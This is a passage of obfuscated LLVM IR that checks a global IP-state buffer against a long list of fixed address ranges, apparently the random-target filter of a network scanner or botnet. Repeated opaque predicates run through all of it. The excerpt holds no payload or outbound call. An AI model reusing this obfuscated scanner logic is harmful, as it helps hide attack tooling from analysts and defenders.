  %3797 = icmp slt i32 %3792, 10
  %3798 = or i1 %3796, %3797
  br i1 %3798, label %originalBB502, label %originalBB502alteredBB

originalBB502:                                    ; preds = %originalBB502alteredBB, %3790
  %3799 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3800 = zext i8 %3799 to i32
  %3801 = icmp eq i32 %3800, 172
  %3802 = load i32, i32* @x.71
  %3803 = load i32, i32* @y.72
  %3804 = sub i32 %3802, 1
  %3805 = mul i32 %3802, %3804
  %3806 = urem i32 %3805, 2
  %3807 = icmp eq i32 %3806, 0
  %3808 = icmp slt i32 %3803, 10
  %3809 = or i1 %3807, %3808
  br i1 %3809, label %originalBBpart2504, label %originalBB502alteredBB

originalBBpart2504:                               ; preds = %originalBB502
  br i1 %3801, label %3810, label %3822

; <label>:3810:                                   ; preds = %originalBBpart2504
  %3811 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3812 = zext i8 %3811 to i32
  %3813 = icmp eq i32 %3812, 98
  br i1 %3813, label %3814, label %3822

; <label>:3814:                                   ; preds = %3810
  %3815 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3816 = zext i8 %3815 to i32
  %3817 = icmp sge i32 %3816, 64
  br i1 %3817, label %3818, label %3822

; <label>:3818:                                   ; preds = %3814
  %3819 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3820 = zext i8 %3819 to i32
  %3821 = icmp slt i32 %3820, 95
  br i1 %3821, label %5042, label %3822

; <label>:3822:                                   ; preds = %3818, %3814, %3810, %originalBBpart2504
  %3823 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3824 = zext i8 %3823 to i32
  %3825 = icmp eq i32 %3824, 184
  br i1 %3825, label %3826, label %3854

; <label>:3826:                                   ; preds = %3822
  %3827 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3828 = zext i8 %3827 to i32
  %3829 = icmp eq i32 %3828, 170
  br i1 %3829, label %3830, label %3854

; <label>:3830:                                   ; preds = %3826
  %3831 = load i32, i32* @x.71
  %3832 = load i32, i32* @y.72
  %3833 = sub i32 %3831, 1
  %3834 = mul i32 %3831, %3833
  %3835 = urem i32 %3834, 2
  %3836 = icmp eq i32 %3835, 0
  %3837 = icmp slt i32 %3832, 10
  %3838 = or i1 %3836, %3837
  br i1 %3838, label %originalBB506, label %originalBB506alteredBB

originalBB506:                                    ; preds = %originalBB506alteredBB, %3830
  %3839 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3840 = zext i8 %3839 to i32
  %3841 = icmp sge i32 %3840, 240
  %3842 = load i32, i32* @x.71
  %3843 = load i32, i32* @y.72
  %3844 = sub i32 %3842, 1
  %3845 = mul i32 %3842, %3844
  %3846 = urem i32 %3845, 2
  %3847 = icmp eq i32 %3846, 0
  %3848 = icmp slt i32 %3843, 10
  %3849 = or i1 %3847, %3848
  br i1 %3849, label %originalBBpart2508, label %originalBB506alteredBB

originalBBpart2508:                               ; preds = %originalBB506
  br i1 %3841, label %3850, label %3854

; <label>:3850:                                   ; preds = %originalBBpart2508
  %3851 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3852 = zext i8 %3851 to i32
  %3853 = icmp slt i32 %3852, 255
  br i1 %3853, label %5042, label %3854

; <label>:3854:                                   ; preds = %3850, %originalBBpart2508, %3826, %3822
  %3855 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3856 = zext i8 %3855 to i32
  %3857 = icmp eq i32 %3856, 192
  br i1 %3857, label %3858, label %3870

; <label>:3858:                                   ; preds = %3854
  %3859 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3860 = zext i8 %3859 to i32
  %3861 = icmp eq i32 %3860, 111
  br i1 %3861, label %3862, label %3870

; <label>:3862:                                   ; preds = %3858
  %3863 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3864 = zext i8 %3863 to i32
  %3865 = icmp sge i32 %3864, 128
  br i1 %3865, label %3866, label %3870

; <label>:3866:                                   ; preds = %3862
  %3867 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3868 = zext i8 %3867 to i32
  %3869 = icmp slt i32 %3868, 143
  br i1 %3869, label %5042, label %3870

; <label>:3870:                                   ; preds = %3866, %3862, %3858, %3854
  %3871 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3872 = zext i8 %3871 to i32
  %3873 = icmp eq i32 %3872, 192
  br i1 %3873, label %3874, label %3902

; <label>:3874:                                   ; preds = %3870
  %3875 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3876 = zext i8 %3875 to i32
  %3877 = icmp eq i32 %3876, 252
  br i1 %3877, label %3878, label %3902

; <label>:3878:                                   ; preds = %3874
  %3879 = load i32, i32* @x.71
  %3880 = load i32, i32* @y.72
  %3881 = sub i32 %3879, 1
  %3882 = mul i32 %3879, %3881
  %3883 = urem i32 %3882, 2
  %3884 = icmp eq i32 %3883, 0
  %3885 = icmp slt i32 %3880, 10
  %3886 = or i1 %3884, %3885
  br i1 %3886, label %originalBB510, label %originalBB510alteredBB

originalBB510:                                    ; preds = %originalBB510alteredBB, %3878
  %3887 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3888 = zext i8 %3887 to i32
  %3889 = icmp sge i32 %3888, 208
  %3890 = load i32, i32* @x.71
  %3891 = load i32, i32* @y.72
  %3892 = sub i32 %3890, 1
  %3893 = mul i32 %3890, %3892
  %3894 = urem i32 %3893, 2
  %3895 = icmp eq i32 %3894, 0
  %3896 = icmp slt i32 %3891, 10
  %3897 = or i1 %3895, %3896
  br i1 %3897, label %originalBBpart2512, label %originalBB510alteredBB

originalBBpart2512:                               ; preds = %originalBB510
  br i1 %3889, label %3898, label %3902

; <label>:3898:                                   ; preds = %originalBBpart2512
  %3899 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3900 = zext i8 %3899 to i32
  %3901 = icmp slt i32 %3900, 223
  br i1 %3901, label %5042, label %3902

; <label>:3902:                                   ; preds = %3898, %originalBBpart2512, %3874, %3870
  %3903 = load i32, i32* @x.71
  %3904 = load i32, i32* @y.72
  %3905 = sub i32 %3903, 1
  %3906 = mul i32 %3903, %3905
  %3907 = urem i32 %3906, 2
  %3908 = icmp eq i32 %3907, 0
  %3909 = icmp slt i32 %3904, 10
  %3910 = or i1 %3908, %3909
  br i1 %3910, label %originalBB514, label %originalBB514alteredBB

originalBB514:                                    ; preds = %originalBB514alteredBB, %3902
  %3911 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3912 = zext i8 %3911 to i32
  %3913 = icmp eq i32 %3912, 192
  %3914 = load i32, i32* @x.71
  %3915 = load i32, i32* @y.72
  %3916 = sub i32 %3914, 1
  %3917 = mul i32 %3914, %3916
  %3918 = urem i32 %3917, 2
  %3919 = icmp eq i32 %3918, 0
  %3920 = icmp slt i32 %3915, 10
  %3921 = or i1 %3919, %3920
  br i1 %3921, label %originalBBpart2516, label %originalBB514alteredBB

originalBBpart2516:                               ; preds = %originalBB514
  br i1 %3913, label %3922, label %3934

; <label>:3922:                                   ; preds = %originalBBpart2516
  %3923 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3924 = zext i8 %3923 to i32
  %3925 = icmp eq i32 %3924, 40
  br i1 %3925, label %3926, label %3934

; <label>:3926:                                   ; preds = %3922
  %3927 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3928 = zext i8 %3927 to i32
  %3929 = icmp sge i32 %3928, 56
  br i1 %3929, label %3930, label %3934

; <label>:3930:                                   ; preds = %3926
  %3931 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3932 = zext i8 %3931 to i32
  %3933 = icmp slt i32 %3932, 59
  br i1 %3933, label %5042, label %3934

; <label>:3934:                                   ; preds = %3930, %3926, %3922, %originalBBpart2516
  %3935 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3936 = zext i8 %3935 to i32
  %3937 = icmp eq i32 %3936, 198
  br i1 %3937, label %3938, label %3950

; <label>:3938:                                   ; preds = %3934
  %3939 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3940 = zext i8 %3939 to i32
  %3941 = icmp eq i32 %3940, 8
  br i1 %3941, label %3942, label %3950

; <label>:3942:                                   ; preds = %3938
  %3943 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3944 = zext i8 %3943 to i32
  %3945 = icmp sge i32 %3944, 81
  br i1 %3945, label %3946, label %3950

; <label>:3946:                                   ; preds = %3942
  %3947 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3948 = zext i8 %3947 to i32
  %3949 = icmp slt i32 %3948, 95
  br i1 %3949, label %5042, label %3950

; <label>:3950:                                   ; preds = %3946, %3942, %3938, %3934
  %3951 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3952 = zext i8 %3951 to i32
  %3953 = icmp eq i32 %3952, 199
  br i1 %3953, label %3954, label %3998

; <label>:3954:                                   ; preds = %3950
  %3955 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3956 = zext i8 %3955 to i32
  %3957 = icmp eq i32 %3956, 116
  br i1 %3957, label %3958, label %3998

; <label>:3958:                                   ; preds = %3954
  %3959 = load i32, i32* @x.71
  %3960 = load i32, i32* @y.72
  %3961 = sub i32 %3959, 1
  %3962 = mul i32 %3959, %3961
  %3963 = urem i32 %3962, 2
  %3964 = icmp eq i32 %3963, 0
  %3965 = icmp slt i32 %3960, 10
  %3966 = or i1 %3964, %3965
  br i1 %3966, label %originalBB518, label %originalBB518alteredBB

originalBB518:                                    ; preds = %originalBB518alteredBB, %3958
  %3967 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3968 = zext i8 %3967 to i32
  %3969 = icmp sge i32 %3968, 112
  %3970 = load i32, i32* @x.71
  %3971 = load i32, i32* @y.72
  %3972 = sub i32 %3970, 1
  %3973 = mul i32 %3970, %3972
  %3974 = urem i32 %3973, 2
  %3975 = icmp eq i32 %3974, 0
  %3976 = icmp slt i32 %3971, 10
  %3977 = or i1 %3975, %3976
  br i1 %3977, label %originalBBpart2520, label %originalBB518alteredBB

originalBBpart2520:                               ; preds = %originalBB518
  br i1 %3969, label %3978, label %3998

; <label>:3978:                                   ; preds = %originalBBpart2520
  %3979 = load i32, i32* @x.71
  %3980 = load i32, i32* @y.72
  %3981 = sub i32 %3979, 1
  %3982 = mul i32 %3979, %3981
  %3983 = urem i32 %3982, 2
  %3984 = icmp eq i32 %3983, 0
  %3985 = icmp slt i32 %3980, 10
  %3986 = or i1 %3984, %3985
  br i1 %3986, label %originalBB522, label %originalBB522alteredBB

originalBB522:                                    ; preds = %originalBB522alteredBB, %3978
  %3987 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3988 = zext i8 %3987 to i32
  %3989 = icmp slt i32 %3988, 119
  %3990 = load i32, i32* @x.71
  %3991 = load i32, i32* @y.72
  %3992 = sub i32 %3990, 1
  %3993 = mul i32 %3990, %3992
  %3994 = urem i32 %3993, 2
  %3995 = icmp eq i32 %3994, 0
  %3996 = icmp slt i32 %3991, 10
  %3997 = or i1 %3995, %3996
  br i1 %3997, label %originalBBpart2524, label %originalBB522alteredBB

originalBBpart2524:                               ; preds = %originalBB522
  br i1 %3989, label %5042, label %3998

; <label>:3998:                                   ; preds = %originalBBpart2524, %originalBBpart2520, %3954, %3950
  %3999 = load i32, i32* @x.71
  %4000 = load i32, i32* @y.72
  %4001 = sub i32 %3999, 1
  %4002 = mul i32 %3999, %4001
  %4003 = urem i32 %4002, 2
  %4004 = icmp eq i32 %4003, 0
  %4005 = icmp slt i32 %4000, 10
  %4006 = or i1 %4004, %4005
  br i1 %4006, label %originalBB526, label %originalBB526alteredBB

originalBB526:                                    ; preds = %originalBB526alteredBB, %3998
  %4007 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4008 = zext i8 %4007 to i32
  %4009 = icmp eq i32 %4008, 199
  %4010 = load i32, i32* @x.71
  %4011 = load i32, i32* @y.72
  %4012 = sub i32 %4010, 1
  %4013 = mul i32 %4010, %4012
  %4014 = urem i32 %4013, 2
  %4015 = icmp eq i32 %4014, 0
  %4016 = icmp slt i32 %4011, 10
  %4017 = or i1 %4015, %4016
  br i1 %4017, label %originalBBpart2528, label %originalBB526alteredBB

originalBBpart2528:                               ; preds = %originalBB526
  br i1 %4009, label %4018, label %4030

; <label>:4018:                                   ; preds = %originalBBpart2528
  %4019 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4020 = zext i8 %4019 to i32
  %4021 = icmp eq i32 %4020, 229
  br i1 %4021, label %4022, label %4030

; <label>:4022:                                   ; preds = %4018
  %4023 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4024 = zext i8 %4023 to i32
  %4025 = icmp sge i32 %4024, 248
  br i1 %4025, label %4026, label %4030

; <label>:4026:                                   ; preds = %4022
  %4027 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4028 = zext i8 %4027 to i32
  %4029 = icmp slt i32 %4028, 255
  br i1 %4029, label %5042, label %4030

; <label>:4030:                                   ; preds = %4026, %4022, %4018, %originalBBpart2528
  %4031 = load i32, i32* @x.71
  %4032 = load i32, i32* @y.72
  %4033 = sub i32 %4031, 1
  %4034 = mul i32 %4031, %4033
  %4035 = urem i32 %4034, 2
  %4036 = icmp eq i32 %4035, 0
  %4037 = icmp slt i32 %4032, 10
  %4038 = or i1 %4036, %4037
  br i1 %4038, label %originalBB530, label %originalBB530alteredBB

originalBB530:                                    ; preds = %originalBB530alteredBB, %4030
  %4039 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4040 = zext i8 %4039 to i32
  %4041 = icmp eq i32 %4040, 199
  %4042 = load i32, i32* @x.71
  %4043 = load i32, i32* @y.72
  %4044 = sub i32 %4042, 1
  %4045 = mul i32 %4042, %4044
  %4046 = urem i32 %4045, 2
  %4047 = icmp eq i32 %4046, 0
  %4048 = icmp slt i32 %4043, 10
  %4049 = or i1 %4047, %4048
  br i1 %4049, label %originalBBpart2532, label %originalBB530alteredBB

originalBBpart2532:                               ; preds = %originalBB530
  br i1 %4041, label %4050, label %4078

; <label>:4050:                                   ; preds = %originalBBpart2532
  %4051 = load i32, i32* @x.71
  %4052 = load i32, i32* @y.72
  %4053 = sub i32 %4051, 1
  %4054 = mul i32 %4051, %4053
  %4055 = urem i32 %4054, 2
  %4056 = icmp eq i32 %4055, 0
  %4057 = icmp slt i32 %4052, 10
  %4058 = or i1 %4056, %4057
  br i1 %4058, label %originalBB534, label %originalBB534alteredBB

originalBB534:                                    ; preds = %originalBB534alteredBB, %4050
  %4059 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4060 = zext i8 %4059 to i32
  %4061 = icmp eq i32 %4060, 36
  %4062 = load i32, i32* @x.71
  %4063 = load i32, i32* @y.72
  %4064 = sub i32 %4062, 1
  %4065 = mul i32 %4062, %4064
  %4066 = urem i32 %4065, 2
  %4067 = icmp eq i32 %4066, 0
  %4068 = icmp slt i32 %4063, 10
  %4069 = or i1 %4067, %4068
  br i1 %4069, label %originalBBpart2536, label %originalBB534alteredBB

originalBBpart2536:                               ; preds = %originalBB534
  br i1 %4061, label %4070, label %4078

; <label>:4070:                                   ; preds = %originalBBpart2536
  %4071 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4072 = zext i8 %4071 to i32
  %4073 = icmp sge i32 %4072, 220
  br i1 %4073, label %4074, label %4078

; <label>:4074:                                   ; preds = %4070
  %4075 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4076 = zext i8 %4075 to i32
  %4077 = icmp slt i32 %4076, 223
  br i1 %4077, label %5042, label %4078

; <label>:4078:                                   ; preds = %4074, %4070, %originalBBpart2536, %originalBBpart2532
  %4079 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4080 = zext i8 %4079 to i32
  %4081 = icmp eq i32 %4080, 199
  br i1 %4081, label %4082, label %4126

; <label>:4082:                                   ; preds = %4078
  %4083 = load i32, i32* @x.71
  %4084 = load i32, i32* @y.72
  %4085 = sub i32 %4083, 1
  %4086 = mul i32 %4083, %4085
  %4087 = urem i32 %4086, 2
  %4088 = icmp eq i32 %4087, 0
  %4089 = icmp slt i32 %4084, 10
  %4090 = or i1 %4088, %4089
  br i1 %4090, label %originalBB538, label %originalBB538alteredBB

originalBB538:                                    ; preds = %originalBB538alteredBB, %4082
  %4091 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4092 = zext i8 %4091 to i32
  %4093 = icmp eq i32 %4092, 58
  %4094 = load i32, i32* @x.71
  %4095 = load i32, i32* @y.72
  %4096 = sub i32 %4094, 1
  %4097 = mul i32 %4094, %4096
  %4098 = urem i32 %4097, 2
  %4099 = icmp eq i32 %4098, 0
  %4100 = icmp slt i32 %4095, 10
  %4101 = or i1 %4099, %4100
  br i1 %4101, label %originalBBpart2540, label %originalBB538alteredBB

originalBBpart2540:                               ; preds = %originalBB538
  br i1 %4093, label %4102, label %4126

; <label>:4102:                                   ; preds = %originalBBpart2540
  %4103 = load i32, i32* @x.71
  %4104 = load i32, i32* @y.72
  %4105 = sub i32 %4103, 1
  %4106 = mul i32 %4103, %4105
  %4107 = urem i32 %4106, 2
  %4108 = icmp eq i32 %4107, 0
  %4109 = icmp slt i32 %4104, 10
  %4110 = or i1 %4108, %4109
  br i1 %4110, label %originalBB542, label %originalBB542alteredBB

originalBB542:                                    ; preds = %originalBB542alteredBB, %4102
  %4111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4112 = zext i8 %4111 to i32
  %4113 = icmp sge i32 %4112, 184
  %4114 = load i32, i32* @x.71
  %4115 = load i32, i32* @y.72
  %4116 = sub i32 %4114, 1
  %4117 = mul i32 %4114, %4116
  %4118 = urem i32 %4117, 2
  %4119 = icmp eq i32 %4118, 0
  %4120 = icmp slt i32 %4115, 10
  %4121 = or i1 %4119, %4120
  br i1 %4121, label %originalBBpart2544, label %originalBB542alteredBB

originalBBpart2544:                               ; preds = %originalBB542
  br i1 %4113, label %4122, label %4126

; <label>:4122:                                   ; preds = %originalBBpart2544
  %4123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4124 = zext i8 %4123 to i32
  %4125 = icmp slt i32 %4124, 187
  br i1 %4125, label %5042, label %4126

; <label>:4126:                                   ; preds = %4122, %originalBBpart2544, %originalBBpart2540, %4078
  %4127 = load i32, i32* @x.71
  %4128 = load i32, i32* @y.72
  %4129 = sub i32 %4127, 1
  %4130 = mul i32 %4127, %4129
  %4131 = urem i32 %4130, 2
  %4132 = icmp eq i32 %4131, 0
  %4133 = icmp slt i32 %4128, 10
  %4134 = or i1 %4132, %4133
  br i1 %4134, label %originalBB546, label %originalBB546alteredBB

originalBB546:                                    ; preds = %originalBB546alteredBB, %4126
  %4135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4136 = zext i8 %4135 to i32
  %4137 = icmp eq i32 %4136, 206
  %4138 = load i32, i32* @x.71
  %4139 = load i32, i32* @y.72
  %4140 = sub i32 %4138, 1
  %4141 = mul i32 %4138, %4140
  %4142 = urem i32 %4141, 2
  %4143 = icmp eq i32 %4142, 0
  %4144 = icmp slt i32 %4139, 10
  %4145 = or i1 %4143, %4144
  br i1 %4145, label %originalBBpart2548, label %originalBB546alteredBB

originalBBpart2548:                               ; preds = %originalBB546
  br i1 %4137, label %4146, label %4190

; <label>:4146:                                   ; preds = %originalBBpart2548
  %4147 = load i32, i32* @x.71
  %4148 = load i32, i32* @y.72
  %4149 = sub i32 %4147, 1
  %4150 = mul i32 %4147, %4149
  %4151 = urem i32 %4150, 2
  %4152 = icmp eq i32 %4151, 0
  %4153 = icmp slt i32 %4148, 10
  %4154 = or i1 %4152, %4153
  br i1 %4154, label %originalBB550, label %originalBB550alteredBB

originalBB550:                                    ; preds = %originalBB550alteredBB, %4146
  %4155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4156 = zext i8 %4155 to i32
  %4157 = icmp eq i32 %4156, 220
  %4158 = load i32, i32* @x.71
  %4159 = load i32, i32* @y.72
  %4160 = sub i32 %4158, 1
  %4161 = mul i32 %4158, %4160
  %4162 = urem i32 %4161, 2
  %4163 = icmp eq i32 %4162, 0
  %4164 = icmp slt i32 %4159, 10
  %4165 = or i1 %4163, %4164
  br i1 %4165, label %originalBBpart2552, label %originalBB550alteredBB

originalBBpart2552:                               ; preds = %originalBB550
  br i1 %4157, label %4166, label %4190

; <label>:4166:                                   ; preds = %originalBBpart2552
  %4167 = load i32, i32* @x.71
  %4168 = load i32, i32* @y.72
  %4169 = sub i32 %4167, 1
  %4170 = mul i32 %4167, %4169
  %4171 = urem i32 %4170, 2
  %4172 = icmp eq i32 %4171, 0
  %4173 = icmp slt i32 %4168, 10
  %4174 = or i1 %4172, %4173
  br i1 %4174, label %originalBB554, label %originalBB554alteredBB

originalBB554:                                    ; preds = %originalBB554alteredBB, %4166
  %4175 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4176 = zext i8 %4175 to i32
  %4177 = icmp sge i32 %4176, 172
  %4178 = load i32, i32* @x.71
  %4179 = load i32, i32* @y.72
  %4180 = sub i32 %4178, 1
  %4181 = mul i32 %4178, %4180
  %4182 = urem i32 %4181, 2
  %4183 = icmp eq i32 %4182, 0
  %4184 = icmp slt i32 %4179, 10
  %4185 = or i1 %4183, %4184
  br i1 %4185, label %originalBBpart2556, label %originalBB554alteredBB

originalBBpart2556:                               ; preds = %originalBB554
  br i1 %4177, label %4186, label %4190

; <label>:4186:                                   ; preds = %originalBBpart2556
  %4187 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4188 = zext i8 %4187 to i32
  %4189 = icmp slt i32 %4188, 175
  br i1 %4189, label %5042, label %4190

; <label>:4190:                                   ; preds = %4186, %originalBBpart2556, %originalBBpart2552, %originalBBpart2548
  %4191 = load i32, i32* @x.71
  %4192 = load i32, i32* @y.72
  %4193 = sub i32 %4191, 1
  %4194 = mul i32 %4191, %4193
  %4195 = urem i32 %4194, 2
  %4196 = icmp eq i32 %4195, 0
  %4197 = icmp slt i32 %4192, 10
  %4198 = or i1 %4196, %4197
  br i1 %4198, label %originalBB558, label %originalBB558alteredBB

originalBB558:                                    ; preds = %originalBB558alteredBB, %4190
  %4199 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4200 = zext i8 %4199 to i32
  %4201 = icmp eq i32 %4200, 208
  %4202 = load i32, i32* @x.71
  %4203 = load i32, i32* @y.72
  %4204 = sub i32 %4202, 1
  %4205 = mul i32 %4202, %4204
  %4206 = urem i32 %4205, 2
  %4207 = icmp eq i32 %4206, 0
  %4208 = icmp slt i32 %4203, 10
  %4209 = or i1 %4207, %4208
  br i1 %4209, label %originalBBpart2560, label %originalBB558alteredBB

originalBBpart2560:                               ; preds = %originalBB558
  br i1 %4201, label %4210, label %4238

; <label>:4210:                                   ; preds = %originalBBpart2560
  %4211 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4212 = zext i8 %4211 to i32
  %4213 = icmp eq i32 %4212, 78
  br i1 %4213, label %4214, label %4238

; <label>:4214:                                   ; preds = %4210
  %4215 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4216 = zext i8 %4215 to i32
  %4217 = icmp sge i32 %4216, 40
  br i1 %4217, label %4218, label %4238

; <label>:4218:                                   ; preds = %4214
  %4219 = load i32, i32* @x.71
  %4220 = load i32, i32* @y.72
  %4221 = sub i32 %4219, 1
  %4222 = mul i32 %4219, %4221
  %4223 = urem i32 %4222, 2
  %4224 = icmp eq i32 %4223, 0
  %4225 = icmp slt i32 %4220, 10
  %4226 = or i1 %4224, %4225
  br i1 %4226, label %originalBB562, label %originalBB562alteredBB

originalBB562:                                    ; preds = %originalBB562alteredBB, %4218
  %4227 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4228 = zext i8 %4227 to i32
  %4229 = icmp slt i32 %4228, 43
  %4230 = load i32, i32* @x.71
  %4231 = load i32, i32* @y.72
  %4232 = sub i32 %4230, 1
  %4233 = mul i32 %4230, %4232
  %4234 = urem i32 %4233, 2
  %4235 = icmp eq i32 %4234, 0
  %4236 = icmp slt i32 %4231, 10
  %4237 = or i1 %4235, %4236
  br i1 %4237, label %originalBBpart2564, label %originalBB562alteredBB

originalBBpart2564:                               ; preds = %originalBB562
  br i1 %4229, label %5042, label %4238

; <label>:4238:                                   ; preds = %originalBBpart2564, %4214, %4210, %originalBBpart2560
  %4239 = load i32, i32* @x.71
  %4240 = load i32, i32* @y.72
  %4241 = sub i32 %4239, 1
  %4242 = mul i32 %4239, %4241
  %4243 = urem i32 %4242, 2
  %4244 = icmp eq i32 %4243, 0
  %4245 = icmp slt i32 %4240, 10
  %4246 = or i1 %4244, %4245
  br i1 %4246, label %originalBB566, label %originalBB566alteredBB

originalBB566:                                    ; preds = %originalBB566alteredBB, %4238
  %4247 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4248 = zext i8 %4247 to i32
  %4249 = icmp eq i32 %4248, 208
  %4250 = load i32, i32* @x.71
  %4251 = load i32, i32* @y.72
  %4252 = sub i32 %4250, 1
  %4253 = mul i32 %4250, %4252
  %4254 = urem i32 %4253, 2
  %4255 = icmp eq i32 %4254, 0
  %4256 = icmp slt i32 %4251, 10
  %4257 = or i1 %4255, %4256
  br i1 %4257, label %originalBBpart2568, label %originalBB566alteredBB

originalBBpart2568:                               ; preds = %originalBB566
  br i1 %4249, label %4258, label %4286

; <label>:4258:                                   ; preds = %originalBBpart2568
  %4259 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4260 = zext i8 %4259 to i32
  %4261 = icmp eq i32 %4260, 93
  br i1 %4261, label %4262, label %4286

; <label>:4262:                                   ; preds = %4258
  %4263 = load i32, i32* @x.71
  %4264 = load i32, i32* @y.72
  %4265 = sub i32 %4263, 1
  %4266 = mul i32 %4263, %4265
  %4267 = urem i32 %4266, 2
  %4268 = icmp eq i32 %4267, 0
  %4269 = icmp slt i32 %4264, 10
  %4270 = or i1 %4268, %4269
  br i1 %4270, label %originalBB570, label %originalBB570alteredBB

originalBB570:                                    ; preds = %originalBB570alteredBB, %4262
  %4271 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4272 = zext i8 %4271 to i32
  %4273 = icmp sge i32 %4272, 192
  %4274 = load i32, i32* @x.71
  %4275 = load i32, i32* @y.72
  %4276 = sub i32 %4274, 1
  %4277 = mul i32 %4274, %4276
  %4278 = urem i32 %4277, 2
  %4279 = icmp eq i32 %4278, 0
  %4280 = icmp slt i32 %4275, 10
  %4281 = or i1 %4279, %4280
  br i1 %4281, label %originalBBpart2572, label %originalBB570alteredBB

originalBBpart2572:                               ; preds = %originalBB570
  br i1 %4273, label %4282, label %4286

; <label>:4282:                                   ; preds = %originalBBpart2572
  %4283 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4284 = zext i8 %4283 to i32
  %4285 = icmp slt i32 %4284, 193
